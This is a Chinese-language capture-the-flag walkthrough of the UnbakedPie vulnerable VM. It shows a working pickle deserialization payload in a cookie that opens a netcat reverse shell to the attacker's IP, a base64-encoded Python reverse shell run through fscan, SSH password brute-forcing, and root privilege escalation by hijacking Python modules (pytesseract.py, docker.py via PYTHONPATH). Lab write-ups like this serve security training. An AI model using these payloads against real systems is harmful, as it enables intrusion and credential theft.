# UnbakedPie

:::note

[Linux VM] [Tested on VirtualBox] created by || ch4rm

⏲️ Release Date // 2020-10-06

✔️ MD5 // 92707e4a6a76dbd738ef2dbe716fcf7c

☠ Root // 31

💀 User // 31

📝Notes //
Requires pivotting and owasp skills. Real life scenarios + a few ctf privesc. Made by ch4rm (@aniqfakhrul) & h0j3n (@h0j3n).

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.119
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.119
Host is up (0.00051s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Fri, 23 Feb 2024 07:34:15 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=wTXfC78Rn0Mg5kXVjEgMPcru1ulwDoVy9t17wj5RmELJZElX5xkCYhkdB4HvTGmw; expires=Fri, 21 Feb 2025 07:34:15 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Fri, 23 Feb 2024 07:34:16 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=r9a0Ot8xvhGgew8qiA5FC2X1Cgl2eiHHtB3YQizhqbxB1owpT998WDNvFlyn5HCf; expires=Fri, 21 Feb 2025 07:34:16 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs
```

## web 服务

![img](img/image_20240211-231132.png)

尝试进行目录爆破

```plaintext
[23:12:47] 200 -    5KB - /about
[23:12:50] 301 -    0B  - /accounts/login  ->  /accounts/login/
[23:12:58] 302 -    0B  - /admin/?/login  ->  /admin/login/?next=/admin/%3F/login
[23:12:58] 302 -    0B  - /admin/  ->  /admin/login/?next=/admin/
[23:12:59] 301 -    0B  - /admin/login  ->  /admin/login/
......
```

未得到有效信息

### 与搜索功能进行交互

在尝试使用搜索功能时，使用 `test` 作为关键词进行搜索，发现本地 Cookie 储存中出现

```plaintext
"gASVCAAAAAAAAACMBHRlc3SULg=="
```

并发现以下返回数据包

```plaintext
HTTP/1.1 200 OK
Date: Fri, 23 Feb 2024 13:00:51 GMT
Server: WSGIServer/0.2 CPython/3.8.6
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 4881
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  search_cookie="gASVCAAAAAAAAACMBHRlc3SULg=="; Path=/
Set-Cookie:  csrftoken=jywYAtaiwPVi0GDpUy243peCMIR3LVPtW5OTnzKTrPxgMWN02CyGeW5NKWKNOiUE; expires=Fri, 21 Feb 2025 13:00:51 GMT; Max-Age=31449600; Path=/; SameSite=Lax
```

产生进行解码

```python
import base64
import pickle

s = "gASVCAAAAAAAAACMBHRlc3SULg=="

s = pickle.loads(base64.b64decode(s))

print(s)
# test
```

可以确定远程服务存在 Python Pickle 序列化相关操作，尝试利用

### 生成反序列化恶意载荷

```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("nc 192.168.56.102 9999 -e /bin/bash",))
print(base64.b64encode(pickle.dumps(P())))
# gASVPwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCRuYyAxOTIuMTY4LjU2LjEwMiA5OTk5IC1lIC9iaW4vYmFzaCCUhZRSlC4=
```

将这个生成的恶意载荷投入浏览会话中，进行交互

```plaintext
POST /search HTTP/1.1
Host: 192.168.56.119:5003
Content-Length: 98
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.56.119:5003
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.119:5003/search
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: csrftoken=dSQDeQ2PWUIMTRw1KjUQeaTIxe2ntAkmPqDcY27I3yYvnHunYadk9MPbt3tmqKSl; search_cookie="gASVPwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCRuYyAxOTIuMTY4LjU2LjEwMiA5OTk5IC1lIC9iaW4vYmFzaCCUhZRSlC4="
Connection: close

csrfmiddlewaretoken=8sIxi3DjITlwk9AQtXq37xpboAzzCPdeK0v62fIcPxBfOZycHOJx29lEkp0yzZLd&query=asasasa
```

成功得到回连的 shell

## User - Docker - root

```bash
┌─[✗]─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 9999
[17:34:56] Welcome to pwncat 🐈!
[17:37:23] received connection from 192.168.56.119:59728
[17:37:24] 192.168.56.119:59728: registered new host w/ db
(local) pwncat$ back
(remote) root@8b39a559b296:/home# whoami
root
```

### 环境探测

使用 `PEASS-ng` 或者 `CDK` 均能检测到我们正处于 Docker 容器内

### 数据库文件读取

在站点目录中，发现一个数据库文件 `/home/site/db.sqlite3`

下载下来进行读取

| id  |                                    password                                    |          last_login          | is_superuser |  username   |
| :-: | :----------------------------------------------------------------------------: | :--------------------------: | :----------: | :---------: |
|  1  | pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo= | "2020-10-03 10:43:47.229292" |      1       | aniqfakhrul |
| 11  | pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg= | "2020-10-02 10:16:45.805533" |      0       |   testing   |
| 12  | pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik= | "2020-10-03 10:44:10.758867" |      0       |   ramsey    |
| 13  | pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE= | "2020-10-02 14:42:59.192571" |      0       |   oliver    |
| 14  | pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY= | "2020-10-02 14:43:15.187554" |      0       |     wan     |

### 命令行历史

```bash title="/root/.bash_history"
ssh ramsey@172.17.0.1
```

从中得到一个用户名 `ramsey`

### 密码爆破

根据数据库中得到的数据，可以得知以下信息

```plaintext
Username: ramsey
Password: pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=
```

尝试直接对密码发起爆破，但是未找到结果

### SSH 爆破

尝试直接对 SSH 服务进行爆破

首先，直接在 Docker 容器内部署 [shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。](https://github.com/shadow1ng/fscan)

```bash
(local) pwncat$ upload ./tools/fscan
./fscan ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 6.3/6.3 MB • 1.7 MB/s • 0:00:00
[20:59:58] uploaded 6.27MiB in 4.03 seconds
```

然后指定用户名为 `ramsey`，开始扫描

```bash
(remote) root@8b39a559b296:/root# ./fscan -h 172.17.0.1 -user ramsey

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.3
start infoscan
172.17.0.1:22 open
[*] alive ports len is: 1
start vulscan
[+] SSH 172.17.0.1:22:ramsey 12345678
已完成 1/1
[*] 扫描结束, 耗时: 58.712306679s
```

成功得到凭据

```plaintext
ramsey:12345678
```

## User - ramsey

由于靶机上并未部署 SSH 客户端，所以采用 fscan 内置的命令执行功能

```bash
(remote) root@8b39a559b296:/root# ./fscan -h 172.17.0.1 -user ramsey -pwd "12345678" -c "echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNTYuMTAyIiw4ODg4KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIikn | base64 -d | bash"

┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 8888
[21:06:55] Welcome to pwncat 🐈!
[21:09:25] received connection from 192.168.56.119:54850
[21:09:26] 192.168.56.119:54850: registered new host w/ db
(local) pwncat$ back
(remote) ramsey@unbaked:/home/ramsey$ whoami
ramsey
```

### flag - user

```plaintext
Unb4ked_W00tw00t
```

### 环境探测

```bash
(remote) ramsey@unbaked:/home/ramsey$ sudo -l
[sudo] password for ramsey:
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
```

### 读取服务源码

```python title="/home/ramsey/vuln.py"
#!/usr/bin/python
# coding=utf-8

try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract
import sys
import os
import time


#Header
def header():
        banner = '''\033[33m
                                      (
                                       )
                                  __..---..__
                              ,-='  /  |  \  `=-.
                             :--..___________..--;
                              \.,_____________,./


██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║
██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
\033[m'''
        return banner

#Function Instructions
def instructions():
        print "\n\t\t\t",9 * "-" , "WELCOME!" , 9 * "-"
        print "\t\t\t","1. Calculator"
        print "\t\t\t","2. Easy Calculator"
        print "\t\t\t","3. Credits"
        print "\t\t\t","4. Exit"
        print "\t\t\t",28 * "-"

def instructions2():
        print "\n\t\t\t",9 * "-" , "CALCULATOR!" , 9 * "-"
        print "\t\t\t","1. Add"
        print "\t\t\t","2. Subtract"
        print "\t\t\t","3. Multiply"
        print "\t\t\t","4. Divide"
        print "\t\t\t","5. Back"
        print "\t\t\t",28 * "-"

def credits():
        print "\n\t\tHope you enjoy learning new things  - Ch4rm & H0j3n\n"

# Function Arithmetic

# Function to add two numbers
def add(num1, num2):
    return num1 + num2

# Function to subtract two numbers
def subtract(num1, num2):
    return num1 - num2

# Function to multiply two numbers
def multiply(num1, num2):
    return num1 * num2

# Function to divide two numbers
def divide(num1, num2):
    return num1 / num2
# Main
if __name__ == "__main__":
        print header()

        #Variables
        OPTIONS = 0
        OPTIONS2 = 0
        TOTAL = 0
        NUM1 = 0
        NUM2 = 0

        while(OPTIONS != 4):
                instructions()
                OPTIONS = int(input("\t\t\tEnter Options>>"))
                print "\033c"
                if OPTIONS == 1:
                        instructions2()
                        OPTIONS2 = int(input("\t\t\tEnter Options>>"))
                        print "\033c"
                        if OPTIONS2 == 5:
                                continue
                        else:
                                NUM1 = int(input("\t\t\tEnter Number1>>"))
                                NUM2 = int(input("\t\t\tEnter Number2>>"))
                                if OPTIONS2 == 1:
                                        TOTAL = add(NUM1,NUM2)
                                if OPTIONS2 == 2:
                                        TOTAL = subtract(NUM1,NUM2)
                                if OPTIONS2 == 3:
                                        TOTAL = multiply(NUM1,NUM2)
                                if OPTIONS2 == 4:
                                        TOTAL = divide(NUM1,NUM2)
                                print "\t\t\tTotal >> $",TOTAL
                if OPTIONS == 2:
                        animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

                        print "\r\t\t\t     Waiting to extract..."
                        for i in range(len(animation)):
                            time.sleep(0.5)
                            sys.stdout.write("\r\t\t\t" + animation[i % len(animation)])
                            sys.stdout.flush()

                        LISTED = pytesseract.image_to_string(Image.open('payload.png'))

                        TOTAL = eval(LISTED)
                        print "\n\n\t\t\tTotal >> $",TOTAL
                if OPTIONS == 3:
                        credits()
        sys.exit(-1)
```

由于文件位于用户目录下，而且 `pytesseract.py` 文件可被当前用户所控制，所以可以直接接管

部署恶意负载

```python
import pty

pty.spawn("/bin/bash")
```

## User - oliver

```bash
(remote) ramsey@unbaked:/home/ramsey$ touch pytesseract.py
(remote) ramsey@unbaked:/home/ramsey$ echo "import pty" > pytesseract.py
(remote) ramsey@unbaked:/home/ramsey$ echo 'pty.spawn("/bin/bash")' >> pytesseract.py
(remote) ramsey@unbaked:/home/ramsey$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
oliver@unbaked:~$ whoami
oliver
```

### 环境探测

```bash
oliver@unbaked:~$ sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
```

### 读取服务源码

```python title="/opt/dockerScript.py"
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```

### 尝试利用

由于还是目录可控，所以可以直接接管 `docker.py`，从而实现提权至 `root`

## User - root

```bash
oliver@unbaked:/home/oliver$ touch /tmp/docker.py
oliver@unbaked:/home/oliver$ echo "import pty" >> /tmp/docker.py
oliver@unbaked:/home/oliver$ echo 'pty.spawn("/bin/bash")' >> /tmp/docker.py
oliver@unbaked:/home/oliver$ sudo PYTHONPATH=/tmp python /opt/dockerScript.py
root@unbaked:/home/oliver# whoami
root
```

### flag - root

```plaintext
CONGRATS ON PWNING THIS BOX!
Created by ch4rm & H0j3n
ps: dont be mad us, we hope you learn something new

flag: Unb4ked_GOtcha!
```
